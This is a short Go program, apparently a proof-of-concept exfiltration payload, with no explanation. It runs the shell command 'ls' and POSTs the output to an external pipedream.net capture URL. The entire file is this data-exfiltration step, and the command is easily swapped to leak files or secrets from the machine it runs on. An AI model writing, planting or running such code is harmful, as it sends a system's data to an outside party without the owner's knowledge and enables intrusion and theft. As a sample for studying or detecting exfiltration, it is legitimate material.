package main

import (
	"bytes"
	"net/http"
	"time"
	"os/exec"
)

func main() {
	cmd := exec.Command("ls")
	output, err := cmd.Output()
	

	req, err := http.NewRequest("POST", "https://eokilzfg6f69brv.m.pipedream.net", bytes.NewReader(output))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: time.Minute}

	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()
}